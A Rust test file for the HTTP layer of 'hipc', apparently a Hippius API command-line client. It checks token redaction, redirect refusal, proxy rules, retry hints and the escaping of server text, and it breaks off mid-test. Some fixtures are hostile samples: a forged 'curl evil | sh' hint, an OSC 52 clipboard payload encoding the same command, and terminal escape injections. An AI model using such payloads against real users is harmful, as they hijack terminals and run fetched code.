//! The HTTP rules every command shares: the API origin, the status map, retry hints,
//! redirects, timeouts, and `--debug`.

use crate::common::{Hipc, Home, Reply, Server, TOKEN, route};

#[test]
fn every_request_names_hip_and_its_version() {
    let server = Server::start(vec![route("GET", "/api/x/", Reply::json(200, "{}"))]);
    Hipc::against(&Home::new(), &server).run(&["api", "GET", "/x/"]);
    assert_eq!(
        server.only_request().header("user-agent"),
        Some(&*format!("hipc/{}", env!("CARGO_PKG_VERSION")))
    );
}

#[test]
fn plain_http_to_anything_but_a_loopback_address_is_refused_before_sending() {
    for url in [
        "http://api.hippius.com",
        "http://10.0.0.1:8080",
        "ftp://api.hippius.com",
        "api.hippius.com",
        "https://api.hippius.com/api",
        "https://user:pass@api.hippius.com",
    ] {
        let error = Hipc::new(&Home::new())
            .env("HIPPIUS_API_URL", url)
            .env("HIPPIUS_TOKEN", TOKEN)
            .run(&["auth", "status"])
            .fails(2, "usage");
        assert!(
            error["hint"].as_str().unwrap().contains("https://"),
            "{url}"
        );
        let error = Hipc::new(&Home::new())
            .env("HIPPIUS_TOKEN", TOKEN)
            .run(&["auth", "status", "--api-url", url])
            .fails(2, "usage");
        assert!(
            error["message"].as_str().unwrap().contains("API origin"),
            "{url}"
        );
    }
}

#[test]
fn statuses_map_to_codes_with_retry_hints_and_side_effects() {
    let server = Server::start(vec![
        route("GET", "/api/s400/", Reply::json(400, r#"{"error":"bad"}"#)),
        route(
            "GET",
            "/api/s402/",
            Reply::json(402, r#"{"error":"Not enough credits"}"#),
        ),
        route(
            "GET",
            "/api/s403/",
            Reply::json(403, r#"{"code":"owner_only","error":"owner"}"#),
        ),
        route(
            "GET",
            "/api/s403b/",
            Reply::json(403, r#"{"error":"Not in the compute beta"}"#),
        ),
        route("GET", "/api/s409/", Reply::json(409, "{}")),
        route("GET", "/api/s422/", Reply::json(422, "{}")),
        route("GET", "/api/s425/", Reply::json(425, "{}")),
        route(
            "GET",
            "/api/s429/",
            Reply::json(429, "{}").header("Retry-After", "2"),
        ),
        route("GET", "/api/s500/", Reply::json(500, "{}")),
        route(
            "GET",
            "/api/s503/",
            Reply::json(503, "{}").header("Retry-After", "5"),
        ),
        route("POST", "/api/w503/", Reply::json(503, "{}")),
        route("POST", "/api/w409/", Reply::json(409, "{}")),
        route("POST", "/api/w501/", Reply::json(501, "{}")),
    ]);
    let home = Home::new();
    let get = |path: &str, exit: i32, code: &str| {
        Hipc::against(&home, &server)
            .run(&["api", "GET", path])
            .fails(exit, code)
    };
    assert_eq!(
        get("/s400/", 1, "validation")["message"],
        format!(
            "cannot call `GET {}/api/s400/`: the API says `bad`",
            server.url()
        )
    );
    get("/s402/", 1, "payment_required");
    get("/s403/", 1, "owner_only");
    get("/s403b/", 1, "permission");
    get("/s409/", 1, "conflict");
    get("/s422/", 1, "validation");
    let early = get("/s425/", 1, "unavailable");
    assert_eq!(early["retryable"], true);
    let limited = get("/s429/", 1, "rate_limited");
    assert_eq!(
        (
            limited["retryable"].clone(),
            limited["retry_after_ms"].clone()
        ),
        (true.into(), 2000.into())
    );
    assert_eq!(get("/s500/", 1, "internal")["retryable"], false);
    let down = get("/s503/", 1, "unavailable");
    assert_eq!(down["retry_after_ms"], 5000);
    assert_eq!(down["side_effects"], "none");
    let post = |path: &str, code: &str| {
        Hipc::against(&home, &server)
            .run(&["api", "POST", path, "--yes"])
            .fails(1, code)
    };
    let maybe_done = post("/w503/", "unavailable");
    assert_eq!(maybe_done["side_effects"], "partial");
    assert_eq!(
        maybe_done["retryable"], false,
        "a retry could do the write twice"
    );
    assert_eq!(post("/w409/", "conflict")["side_effects"], "none");
    assert_eq!(post("/w501/", "internal")["retryable"], false);
}

#[test]
fn a_redirect_is_not_followed_so_the_token_stays_home() {
    let elsewhere = Server::start(vec![route("GET", "/steal/", Reply::json(200, "{}"))]);
    let target = format!("{}/steal/", elsewhere.url());
    let server = Server::start(vec![route(
        "GET",
        "/api/moved/",
        Reply::json(302, "").header("Location", &target),
    )]);
    let error = Hipc::against(&Home::new(), &server)
        .run(&["api", "GET", "/moved/"])
        .fails(1, "internal");
    assert!(error["message"].as_str().unwrap().contains(&target));
    assert!(elsewhere.requests().is_empty());
}

/// An error answer that repeats the token `hipc` sent prints it nowhere: not in the message,
/// the details, the request id, or a redirect target, in either mode.
#[test]
fn an_error_answer_that_echoes_the_token_never_prints_it() {
    let echo = serde_json::json!({
        "detail": format!("Invalid token {TOKEN}"),
        "token": TOKEN,
        "n": [TOKEN],
    })
    .to_string();
    let server = Server::start(vec![
        route(
            "GET",
            "/api/echo/",
            Reply::json(401, &echo).header("X-Request-Id", &format!("req-{TOKEN}")),
        ),
        route(
            "GET",
            "/api/moved/",
            Reply::json(302, "").header("Location", &format!("/to/{TOKEN}/")),
        ),
    ]);
    let home = Home::new();
    for (path, exit, code) in [("/echo/", 1, "auth"), ("/moved/", 1, "internal")] {
        let run = Hipc::against(&home, &server).run(&["api", "GET", path]);
        let error = run.fails(exit, code);
        assert!(!run.stderr().contains(TOKEN), "{}", run.stderr());
        assert!(error.to_string().contains("<redacted>"), "{error}");
        let text = Hipc::against(&home, &server).run(&["--output", "text", "api", "GET", path]);
        assert_eq!(text.code(), Some(exit));
        assert!(!text.stderr().contains(TOKEN), "{}", text.stderr());
    }
    let error = Hipc::against(&home, &server)
        .run(&["api", "GET", "/echo/"])
        .fails(1, "auth");
    assert_eq!(
        error["message"],
        "cannot call `GET {}/api/echo/`: the API says `Invalid token <redacted>`"
            .replace("{}", server.url())
    );
    assert_eq!(error["request_id"], "req-<redacted>");
    assert_eq!(
        error["details"],
        serde_json::json!({
            "detail": "Invalid token <redacted>",
            "token": "<redacted>",
            "n": ["<redacted>"],
        })
    );
    // Without a token there is nothing to redact: the answer is quoted as sent.
    let plain = Server::start(vec![route(
        "GET",
        "/api/plain/",
        Reply::json(404, r#"{"detail":"no <redacted> here"}"#),
    )]);
    let error = Hipc::new(&home)
        .env("HIPPIUS_API_URL", plain.url())
        .run(&["api", "GET", "/plain/"])
        .fails(1, "not_found");
    assert_eq!(error["details"]["detail"], "no <redacted> here");
}

/// A token with reserved characters and a backtick is redacted in every spelling an error
/// can carry: as sent, as a message quotes it (`\u{60}`), and percent-encoded with
/// uppercase or lowercase hex.
#[test]
fn every_spelling_of_an_echoed_token_is_redacted() {
    let token = "tok_a/b+c`d=e?f";
    let upper = "tok_a%2Fb%2Bc%60d%3De%3Ff";
    let lower = "tok_a%2fb%2bc%60d%3de%3ff";
    let quoted = r"tok_a/b+c\u{60}d=e?f";
    let echo = serde_json::json!({"detail": format!("bad {token}"), "url": format!("/x/{lower}/")});
    let server = Server::start(vec![
        route(
            "GET",
            "/api/echo/",
            Reply::json(401, &echo.to_string()).header("X-Request-Id", upper),
        ),
        route(
            "GET",
            "/api/upper/",
            Reply::json(302, "").header("Location", &format!("/to/{upper}/")),
        ),
        route(
            "GET",
            "/api/lower/",
            Reply::json(302, "").header("Location", &format!("/to/{lower}/")),
        ),
    ]);
    let home = Home::new();
    for path in ["/echo/", "/upper/", "/lower/"] {
        for mode in ["json", "text"] {
            let run = Hipc::against(&home, &server)
                .env("HIPPIUS_TOKEN", token)
                .run(&["--output", mode, "api", "GET", path]);
            assert_eq!(run.code(), Some(1), "{}", run.stderr());
            for spelling in [token, upper, lower, quoted] {
                assert!(
                    !run.stderr().contains(spelling),
                    "{path} {mode} prints `{spelling}`: {}",
                    run.stderr()
                );
            }
            assert!(run.stderr().contains("<redacted>"), "{}", run.stderr());
        }
    }
}

#[test]
fn a_server_that_never_answers_times_out() {
    let server = Server::start(vec![
        route("GET", "/api/slow/", Reply::never()),
        route("POST", "/api/slow/", Reply::never()),
    ]);
    let error = Hipc::against(&Home::new(), &server)
        .run(&["api", "GET", "/slow/", "--request-timeout", "1"])
        .fails(1, "timeout");
    assert_eq!(error["retryable"], true);
    assert_eq!(error["side_effects"], "none");
    let error = Hipc::against(&Home::new(), &server)
        .run(&["api", "POST", "/slow/", "--request-timeout", "1", "--yes"])
        .fails(1, "timeout");
    assert_eq!(
        error["side_effects"], "partial",
        "a sent write may have been applied"
    );
}

#[test]
fn a_closed_port_is_unavailable_and_nothing_was_sent() {
    // `Hipc::new` aims at `no_server()`, a loopback port that refuses connections.
    let error = Hipc::new(&Home::new())
        .env("HIPPIUS_TOKEN", TOKEN)
        .run(&["api", "POST", "/x/", "--yes"])
        .fails(1, "unavailable");
    assert_eq!(error["side_effects"], "none");
    assert_eq!(error["retryable"], true);
}

#[test]
fn debug_prints_method_url_and_status_and_never_a_secret() {
    let server = Server::start(vec![
        route("GET", "/api/x/", Reply::json(200, "{}")),
        route("GET", "/api/missing/", Reply::json(404, "{}")),
    ]);
    let home = Home::new();
    let run = Hipc::against(&home, &server).run(&["api", "GET", "/x/", "--debug"]);
    assert_eq!(run.code(), Some(0));
    assert_eq!(
        run.stderr(),
        format!("debug: GET {}/api/x/\ndebug: -> 200\n", server.url())
    );
    let run = Hipc::against(&home, &server).run(&["api", "GET", "/missing/", "--debug"]);
    assert_eq!(run.code(), Some(1));
    let lines: Vec<&str> = run.stderr().lines().collect();
    assert_eq!(lines[1], "debug: -> 404");
    assert!(lines[2].starts_with("{\"error\""));
    let closed = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://127.0.0.1:{}", closed.local_addr().unwrap().port());
    drop(closed);
    let run = Hipc::new(&home)
        .env("HIPPIUS_API_URL", &url)
        .run(&["api", "GET", "/x/", "--debug"]);
    assert!(
        run.stderr().contains("debug: -> no answer (unavailable)"),
        "{}",
        run.stderr()
    );
}

#[test]
fn a_public_route_works_without_a_token_and_sends_no_authorization() {
    let server = Server::start(vec![route(
        "GET",
        "/api/drive/plans/",
        Reply::json(200, "[]"),
    )]);
    let run = Hipc::new(&Home::new())
        .env("HIPPIUS_API_URL", server.url())
        .run(&["api", "GET", "/drive/plans/"]);
    assert_eq!(run.code(), Some(0));
    assert_eq!(server.only_request().header("authorization"), None);
}

#[test]
fn a_write_without_a_body_sends_content_length_zero_not_chunked() {
    let server = Server::start(vec![
        route("POST", "/api/x/", Reply::json(200, "{}")),
        route("PUT", "/api/x/", Reply::json(200, "{}")),
        route("PATCH", "/api/x/", Reply::json(200, "{}")),
        route("DELETE", "/api/x/", Reply::json(200, "{}")),
    ]);
    let home = Home::new();
    for method in ["POST", "PUT", "PATCH"] {
        Hipc::against(&home, &server)
            .run(&["api", method, "/x/", "--yes"])
            .ok();
    }
    Hipc::against(&home, &server)
        .run(&["api", "DELETE", "/x/", "--yes"])
        .ok();
    let requests = server.requests();
    for request in &requests[..3] {
        assert_eq!(
            request.header("content-length"),
            Some("0"),
            "{}",
            request.method
        );
        assert_eq!(
            request.header("transfer-encoding"),
            None,
            "{}",
            request.method
        );
    }
    assert_eq!(requests[3].header("transfer-encoding"), None);
    assert_eq!(requests[3].body, b"");
}

#[test]
fn a_failed_tls_handshake_sent_nothing_and_is_not_retryable() {
    // https to a listener that answers in plain HTTP at once: rustls rejects the reply
    // before any request byte is sent, as it rejects an untrusted certificate.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind a local port");
    let url = format!(
        "https://127.0.0.1:{}",
        listener.local_addr().expect("a bound address").port()
    );
    std::thread::spawn(move || {
        use std::io::{Read as _, Write as _};
        if let Ok((mut stream, _)) = listener.accept() {
            // Read the ClientHello before answering, and drain until the client closes.
            // Closing with unread bytes makes the kernel send a reset, which the client
            // sees as a lost connection instead of the non-TLS answer under test.
            let mut hello = [0_u8; 1];
            drop(stream.read_exact(&mut hello));
            drop(stream.write_all(b"HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"));
            drop(stream.shutdown(std::net::Shutdown::Write));
            let mut rest = Vec::new();
            drop(stream.read_to_end(&mut rest));
        }
    });
    let error = Hipc::new(&Home::new())
        .env("HIPPIUS_API_URL", &url)
        .with_env_token(&url, TOKEN)
        .run(&["api", "POST", "/x/", "--yes"])
        .fails(1, "unavailable");
    assert_eq!(error["side_effects"], "none");
    assert_eq!(error["retryable"], false);
}

#[test]
fn a_tls_handshake_that_stalls_sent_nothing_and_may_be_retried() {
    // https to a listener that takes the ClientHello and never answers: the timeout fires
    // inside the handshake, before any request byte is written, so even a POST is safe to
    // retry.
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind a local port");
    let url = format!(
        "https://127.0.0.1:{}",
        listener.local_addr().expect("a bound address").port()
    );
    std::thread::spawn(move || {
        use std::io::Read as _;
        if let Ok((mut stream, _)) = listener.accept() {
            // Hold the connection open until the client gives up and closes it.
            let mut hello = Vec::new();
            drop(stream.read_to_end(&mut hello));
        }
    });
    let error = Hipc::new(&Home::new())
        .env("HIPPIUS_API_URL", &url)
        .with_env_token(&url, TOKEN)
        .run(&["api", "POST", "/x/", "--yes", "--request-timeout", "1"])
        .fails(1, "timeout");
    assert_eq!(error["side_effects"], "none");
    assert_eq!(error["retryable"], true);
}

#[test]
fn a_write_that_stalls_at_the_proxy_was_not_sent() {
    // The CONNECT line is the proxy's, not the request: a POST whose proxy never answers,
    // or answers and then stalls the API's TLS handshake, never left the client.
    for answer_connect in [false, true] {
        let proxy = std::net::TcpListener::bind("127.0.0.1:0").expect("bind a local port");
        let proxy_url = format!(
            "http://127.0.0.1:{}",
            proxy.local_addr().expect("a bound address").port()
        );
        std::thread::spawn(move || {
            use std::io::{Read as _, Write as _};
            if let Ok((mut stream, _)) = proxy.accept() {
                if answer_connect {
                    // Read up to the end of the CONNECT head, then open the tunnel.
                    let mut head = Vec::new();
                    let mut byte = [0_u8; 1];
                    while !head.ends_with(b"\r\n\r\n") && stream.read_exact(&mut byte).is_ok() {
                        head.push(byte[0]);
                    }
                    drop(stream.write_all(b"HTTP/1.1 200 Connection established\r\n\r\n"));
                }
                // Hold the connection open until the client gives up and closes it.
                let mut rest = Vec::new();
                drop(stream.read_to_end(&mut rest));
            }
        });
        let error = Hipc::new(&Home::new())
            // `.invalid` never resolves: if the proxy were skipped, this fails as
            // `unavailable` instead of reaching a real host.
            .env("HIPPIUS_API_URL", "https://hipc-test.invalid")
            .with_env_token("https://hipc-test.invalid", TOKEN)
            .env("HTTPS_PROXY", &proxy_url)
            .env("ALL_PROXY", &proxy_url)
            .run(&["api", "POST", "/x/", "--yes", "--request-timeout", "1"])
            .fails(1, "timeout");
        assert_eq!(
            error["side_effects"], "none",
            "answer CONNECT: {answer_connect}"
        );
        assert_eq!(error["retryable"], true, "answer CONNECT: {answer_connect}");
    }
}

#[test]
fn all_reports_the_real_refusal_of_a_next_link_on_the_api_origin() {
    let server = Server::start(vec![route(
        "GET",
        "/api/compute/vms/",
        Reply::json(
            200,
            r#"{"next":"{base}/api/compute/../drive/","results":[1]}"#,
        ),
    )]);
    let error = Hipc::against(&Home::new(), &server)
        .run(&["api", "GET", "/compute/vms/", "--all"])
        .fails(1, "internal");
    // The real refusal is named, and it is not the caller's usage error: the server wrote it.
    assert!(
        error["message"].as_str().unwrap().contains("`..` segment"),
        "{error}"
    );
}

/// A server that sends a status line and headers with `Content-Length: 100`, one byte of
/// body, and then nothing, so the body read times out after the status arrived.
fn stalled_body(status: &str) -> (String, std::thread::JoinHandle<()>) {
    use std::io::{Read as _, Write as _};
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind a local port");
    let url = format!("http://{}", listener.local_addr().expect("a bound address"));
    let status = status.to_owned();
    let handle = std::thread::spawn(move || {
        let (mut stream, _) = listener.accept().expect("hipc connects");
        let mut buf = [0_u8; 4096];
        let _ = stream.read(&mut buf).expect("read the request");
        // The request id echoes the token, which no error may print.
        let head = format!(
            "HTTP/1.1 {status}\r\nX-Request-Id: req-{TOKEN}\r\nContent-Length: 100\r\n\r\n{{"
        );
        stream.write_all(head.as_bytes()).expect("write the head");
        // Hold the connection until the client gives up; how the read ends does not
        // matter.
        drop(stream.read(&mut buf));
    });
    (url, handle)
}

#[test]
fn a_write_whose_2xx_body_stalls_was_done_and_is_not_retryable() {
    let (url, server) = stalled_body("201 Created");
    let error = Hipc::new(&Home::new())
        .env("HIPPIUS_API_URL", &url)
        .with_env_token(&url, TOKEN)
        .run(&["--request-timeout", "1", "api", "POST", "/x/", "--yes"])
        .fails(1, "timeout");
    server.join().unwrap();
    assert_eq!(error["http_status"], 201);
    assert_eq!(error["side_effects"], "partial");
    assert_eq!(error["retryable"], false);
    assert_eq!(error["request_id"], "req-<redacted>");
}

#[test]
fn a_refused_write_whose_body_stalls_is_still_that_refusal() {
    let (url, server) = stalled_body("409 Conflict");
    let error = Hipc::new(&Home::new())
        .env("HIPPIUS_API_URL", &url)
        .with_env_token(&url, TOKEN)
        .run(&["--request-timeout", "1", "api", "POST", "/x/", "--yes"])
        .fails(1, "conflict");
    server.join().unwrap();
    assert_eq!(error["side_effects"], "none");
    assert_eq!(error["retryable"], false);
}

#[test]
fn a_proxy_in_the_environment_never_carries_a_plain_http_request() {
    // The "proxy" is a listener that records whether anything reached it.
    let proxy = Server::start(vec![]);
    let server = Server::start(vec![route("GET", "/api/x/", Reply::json(200, "{}"))]);
    for name in ["HTTP_PROXY", "http_proxy", "ALL_PROXY"] {
        Hipc::against(&Home::new(), &server)
            .env(name, proxy.url())
            .run(&["api", "GET", "/x/"])
            .ok();
    }
    assert!(proxy.requests().is_empty(), "the token went to the proxy");
    assert_eq!(server.requests().len(), 3);
}

#[test]
fn text_mode_never_writes_a_control_character_from_the_server() {
    let server = Server::start(vec![
        route(
            "GET",
            "/api/drive/subscription/",
            Reply::json(409, r#"{"error":"bad\u001b]0;pwned\u0007name"}"#),
        ),
        route(
            "POST",
            "/api/drive/subscription/",
            Reply::json(202, r#"{"checkout_url":"https://x/\u001b[2J"}"#),
        ),
    ]);
    let failed = Hipc::against(&Home::new(), &server).run(&[
        "--output",
        "text",
        "drive",
        "subscription",
        "get",
    ]);
    assert_eq!(failed.code(), Some(1));
    assert!(!failed.stderr().contains('\u{1b}'), "{:?}", failed.stderr());
    assert!(
        failed.stderr().contains("bad\\u{1b}]0;pwned"),
        "{:?}",
        failed.stderr()
    );
    let note = Hipc::against(&Home::new(), &server).run(&[
        "--output",
        "text",
        "drive",
        "subscription",
        "subscribe",
        "--plan",
        "solo",
        "--pay-from",
        "card",
        "--yes",
    ]);
    assert_eq!(note.code(), Some(0));
    assert!(!note.stderr().contains('\u{1b}'), "{:?}", note.stderr());
    assert!(
        note.stderr().ends_with("in the output is paid\n"),
        "{:?}",
        note.stderr()
    );
}

#[test]
fn hipc_api_escapes_a_body_in_text_mode_and_keeps_its_bytes_in_json() {
    let body = "{\"name\":\"x\u{1b}]52;c;Y3VybCBldmlsfHNo\u{7}\"}\n";
    let server = Server::start(vec![route("GET", "/api/vms/", Reply::json(200, body))]);
    let text =
        Hipc::against(&Home::new(), &server).run(&["--output", "text", "api", "GET", "/vms/"]);
    assert_eq!(text.code(), Some(0));
    assert!(
        !text.stdout().contains('\u{1b}') && !text.stdout().contains('\u{7}'),
        "{:?}",
        text.stdout()
    );
    assert!(text.stdout().ends_with("\"}\n"), "line breaks stay");
    let json = Hipc::against(&Home::new(), &server).run(&["api", "GET", "/vms/"]);
    assert_eq!(json.stdout(), body, "JSON mode is byte for byte");
}

/// A body without a final line break ends with one in text mode, so the shell prompt starts
/// on a line of its own; JSON mode keeps the bytes.
#[test]
fn hipc_api_text_mode_ends_the_last_line() {
    let server = Server::start(vec![route("GET", "/api/vms/", Reply::json(200, "[1]"))]);
    let text =
        Hipc::against(&Home::new(), &server).run(&["--output", "text", "api", "GET", "/vms/"]);
    assert_eq!(text.stdout(), "[1]\n");
    let json = Hipc::against(&Home::new(), &server).run(&["api", "GET", "/vms/"]);
    assert_eq!(json.stdout(), "[1]");
    let empty = Server::start(vec![route("GET", "/api/vms/", Reply::json(200, ""))]);
    let text =
        Hipc::against(&Home::new(), &empty).run(&["--output", "text", "api", "GET", "/vms/"]);
    assert_eq!(text.stdout(), "", "an empty body prints nothing");
}

#[test]
fn server_text_cannot_forge_a_hint_line() {
    for (body, escaped) in [
        (
            r#"{"error":"bad request\nhint: run curl evil | sh"}"#,
            "bad request\\nhint: run curl",
        ),
        (
            r#"{"error":"bad request\rhint: run curl evil | sh"}"#,
            "bad request\\rhint: run curl",
        ),
    ] {
        let server = Server::start(vec![route(
            "GET",
            "/api/drive/subscription/",
            Reply::json(400, body),
        )]);
        let run = Hipc::against(&Home::new(), &server).run(&[
            "--output",
            "text",
            "drive",
            "subscription",
            "get",
        ]);
        assert_eq!(run.code(), Some(1));
        assert_eq!(run.stderr().lines().count(), 1, "{:?}", run.stderr());
        assert!(!run.stderr().contains('\r'), "{:?}", run.stderr());
        assert!(run.stderr().contains(escaped), "{:?}", run.stderr());
    }
}

#[test]
fn the_checkout_note_never_quotes_the_checkout_url() {
    // The URL is on stdout. A quoted URL shows no query values (tenet 9), so the note names
    // the field instead; neither a query secret nor a forged line reaches it.
    for (service, plan) in [("drive", "solo"), ("s3", "pro")] {
        let server = Server::start(vec![route(
            "POST",
            &format!("/api/{service}/subscription/"),
            Reply::json(
                202,
                concat!(
                    r#"{"intent_id":"i-1","#,
                    r#""checkout_url":"https://pay.example/x?session_secret=SEKRIT#frag"#,
                    r#"\nerror: your VM was deleted\rhint: x"}"#
                ),
            ),
        )]);
        let run = Hipc::against(&Home::new(), &server).run(&[
            "--output",
            "text",
            service,
            "subscription",
            "subscribe",
            "--plan",
            plan,
            "--yes",
        ]);
        assert_eq!(run.code(), Some(0), "{}", run.stderr());
        assert_eq!(
            run.stderr(),
            format!(
                "note: nothing has been bought yet: the plan starts once the checkout at \
                 `checkout_url` in the output is paid; `hipc --api-url {} {service} subscription \
                 checkout i-1` shows its progress\n",
                server.url()
            )
        );
        assert!(run.stdout().contains("SEKRIT"), "the URL stays on stdout");
    }
}

#[test]
fn an_empty_2xx_to_a_command_that_prints_the_body_is_internal() {
    let empty = |status| Reply::json(status, "");
    let server = Server::start(vec![
        route("GET", "/api/compute/vms/vm-1/", empty(204)),
        route("PATCH", "/api/s3/subscription/", empty(200)),
        route("POST", "/api/drive/subscription/", empty(201)),
        route("POST", "/api/compute/vms/", empty(201)),
    ]);
    let hipc = |args: &[&str]| Hipc::against(&Home::new(), &server).run(args);
    // A read did nothing, so it is safe to retry; the stdout is never `null`.
    let error = hipc(&["compute", "vms", "get", "vm-1"]).fails(1, "internal");
    assert_eq!(error["side_effects"], "none");
    assert_eq!(error["http_status"], 204);
    // A 2xx to a write means the write was done.
    for args in [
        &["s3", "subscription", "change", "--plan", "pro", "--yes"][..],
        &[
            "drive",
            "subscription",
            "subscribe",
            "--plan",
            "solo",
            "--yes",
        ],
        &[
            "compute",
            "vms",
            "create",
            "--flavor",
            "small",
            "--ssh-key-id",
            "7",
            "--no-wait",
            "--yes",
        ],
    ] {
        let error = hipc(args).fails(1, "internal");
        assert_eq!(error["side_effects"], "partial", "{args:?}");
        assert_eq!(error["retryable"], false, "{args:?}");
    }
}

/// A 2xx a command refuses puts the server's body in `details`, cleaned as an error answer
/// is: the token echoed in it is redacted, and the secret fields are dropped.
#[test]
fn a_refused_2xx_that_echoes_the_token_never_prints_it() {
    let echo = serde_json::json!({
        "vm_id": "v1",
        "echo": format!("Token {TOKEN}"),
        "secret": "S3CRETVALUE",
        "credentials": {"password": "PW"},
    })
    .to_string();
    let server = Server::start(vec![route(
        "GET",
        "/api/compute/vms/v1/",
        Reply::json(200, &echo).header("X-Request-Id", &format!("req-{TOKEN}")),
    )]);
    let run =
        Hipc::against(&Home::new(), &server).run(&["compute", "vms", "power-policy", "get", "v1"]);
    let error = run.fails(1, "internal");
    for secret in [TOKEN, "S3CRETVALUE", "PW"] {
        assert!(
            !run.stderr().contains(secret),
            "{secret} in {}",
            run.stderr()
        );
    }
    assert_eq!(error["details"]["echo"], "Token <redacted>");
    assert_eq!(error["request_id"], "req-<redacted>");
}

/// The proxy variables the HTTP library reads, and `NO_PROXY`.
const PROXY_VARIABLES: [&str; 8] = [
    "ALL_PROXY",
    "all_proxy",
    "HTTPS_PROXY",
    "https_proxy",
    "HTTP_PROXY",
    "http_proxy",
    "NO_PROXY",
    "no_proxy",
];

/// A proxy the HTTP library cannot use, a SOCKS proxy or a URL it cannot parse, would be
/// skipped and the request sent directly, around the proxy: `hipc` refuses before sending,
/// naming the variable. The first variable set decides, in the library's order; an empty one
/// is unset.
#[test]
fn a_proxy_hipc_cannot_use_is_refused_before_sending() {
    for (name, value) in [
        ("ALL_PROXY", "socks5h://u:p@127.0.0.1:1"),
        ("all_proxy", "socks4://127.0.0.1:1"),
        ("HTTPS_PROXY", "ht!tp://u:p@[bad"),
        ("http_proxy", "socks5://127.0.0.1:1"),
    ] {
        let mut hipc = Hipc::new(&Home::new());
        // Only the variable under test is set, whatever the runner's environment holds.
        for other in PROXY_VARIABLES {
            hipc = hipc.env_remove(other);
        }
        let error = hipc
            // `.invalid` never resolves: a request sent directly fails as `unavailable`.
            .env("HIPPIUS_API_URL", "https://hipc-test.invalid")
            .with_env_token("https://hipc-test.invalid", TOKEN)
            .env("ALL_PROXY", "")
            .env(name, value)
            .run(&["api", "GET", "/x/", "--dry-run"])
            .fails(2, "usage");
        assert_eq!(
            error["message"],
            format!("`{name}` is not an `http` or `https` proxy URL, the only proxies `hipc` uses"),
            "{name}={value}"
        );
        assert!(!error.to_string().contains("u:p"), "{error}");
    }
    // A usable proxy first wins over an unusable one after it, and plain http to the loopback
    // origin reads no proxy at all.
    let server = Server::start(vec![route("GET", "/api/x/", Reply::json(200, "{}"))]);
    Hipc::against(&Home::new(), &server)
        .env("ALL_PROXY", "socks5://127.0.0.1:1")
        .run(&["api", "GET", "/x/"])
        .ok();
    let mut hipc = Hipc::new(&Home::new());
    for other in PROXY_VARIABLES {
        hipc = hipc.env_remove(other);
    }
    hipc.env("HIPPIUS_API_URL", "https://hipc-test.invalid")
        .with_env_token("https://hipc-test.invalid", TOKEN)
        .env("ALL_PROXY", "http://127.0.0.1:1")
        .env("HTTP_PROXY", "socks5://127.0.0.1:1")
        .run(&["api", "GET", "/x/", "--dry-run"])
        .ok();
}

/// Server text is quoted up to a fixed length, followed by how much more there is; `details`
/// keeps the whole body. A request id too long to be one is dropped.
#[test]
fn a_long_server_message_is_cut_and_says_so() {
    let detail = "x".repeat(600);
    let body = serde_json::json!({ "detail": detail }).to_string();
    let server = Server::start(vec![route(
        "GET",
        "/api/long/",
        Reply::json(400, &body).header("X-Request-Id", &"r".repeat(201)),
    )]);
    let error = Hipc::against(&Home::new(), &server)
        .run(&["api", "GET", "/long/"])
        .fails(1, "validation");
    assert_eq!(
        error["message"],
        format!(
            "cannot call `GET {}/api/long/`: the API says `{}` and 88 more characters (all in \
             `details`, which `--json` prints)",
            server.url(),
            "x".repeat(512)
        )
    );
    assert_eq!(error["details"]["detail"], detail);
    assert_eq!(error["request_id"], serde_json::Value::Null);
    // A token that the cut would split is redacted before the cut, so no part of it shows.
    let body = serde_json::json!({ "detail": format!("{}{TOKEN}", "x".repeat(490)) }).to_string();
    let server = Server::start(vec![route("GET", "/api/split/", Reply::json(400, &body))]);
    let run = Hipc::against(&Home::new(), &server).run(&["api", "GET", "/split/"]);
    let error = run.fails(1, "validation");
    assert!(!run.stderr().contains(&TOKEN[..12]), "{}", run.stderr());
    assert!(
        error["message"].as_str().unwrap().ends_with("<redacted>`"),
        "{error}"
    );
    // So is one in a redirect's target.
    let location = format!("/{}{TOKEN}/", "y".repeat(490));
    let server = Server::start(vec![route(
        "GET",
        "/api/moved/",
        Reply::json(302, "").header("Location", &location),
    )]);
    let run = Hipc::against(&Home::new(), &server).run(&["api", "GET", "/moved/"]);
    run.fails(1, "internal");
    assert!(!run.stderr().contains(&TOKEN[..12]), "{}", run.stderr());
}

/// A `Retry-After` over a day is ignored: the error stays retryable, with no wait to follow.
#[test]
fn a_retry_after_past_a_day_is_ignored() {
    let server = Server::start(vec![
        route(
            "GET",
            "/api/far/",
            Reply::json(429, "{}").header("Retry-After", "18446744073709551"),
        ),
        route(
            "GET",
            "/api/day/",
            Reply::json(429, "{}").header("Retry-After", "86400"),
        ),
    ]);
    let home = Home::new();
    let far = Hipc::against(&home, &server)
        .run(&["api", "GET", "/far/"])
        .fails(1, "rate_limited");
    assert_eq!(far["retryable"], true);
    assert_eq!(far["retry_after_ms"], serde_json::Value::Null);
    assert_eq!(far["hint"], "wait a minute, then run the command again");
    let day = Hipc::against(&home, &server)
        .run(&["api", "GET", "/day/"])
        .fails(1, "rate_limited");
    assert_eq!(day["retry_after_ms"], 86_400_000);
    // A subscribe whose 503 means nothing was done stays so with any delay: `none`, and
    // retryable, though the wait is not taken.
    let chain = Server::start(vec![route(
        "POST",
        "/api/drive/subscription/",
        Reply::json(503, "{}").header("Retry-After", "90000"),
    )]);
    let error = Hipc::against(&home, &chain)
        .run(&["api", "POST", "/drive/subscription/", "--yes"])
        .fails(1, "unavailable");
    assert_eq!(error["side_effects"], "none");
    assert_eq!(error["retryable"], true);
    assert_eq!(error["retry_after_ms"], serde_json::Value::Null);
}

/// An answer that is not valid HTTP arrived, so it is no broken connection: `internal`, and a
/// retry would get the same answer. After a write it may have been done.
#[test]
fn an_answer_that_is_not_valid_http_is_internal_and_not_retryable() {
    let mut many = Reply::json(200, "{}");
    for n in 0..200 {
        many = many.header(&format!("X-Filler-{n}"), "x");
    }
    let server = Server::start(vec![
        route(
            "GET",
            "/api/control/",
            Reply::json(200, "{}").header("X-Request-Id", "abc\u{1b}[2J"),
        ),
        route("GET", "/api/many/", many),
        route(
            "POST",
            "/api/control/",
            Reply::json(201, "{}").header("X-Request-Id", "abc\u{1b}[2J"),
        ),
    ]);
    let home = Home::new();
    for path in ["/control/", "/many/"] {
        let error = Hipc::against(&home, &server)
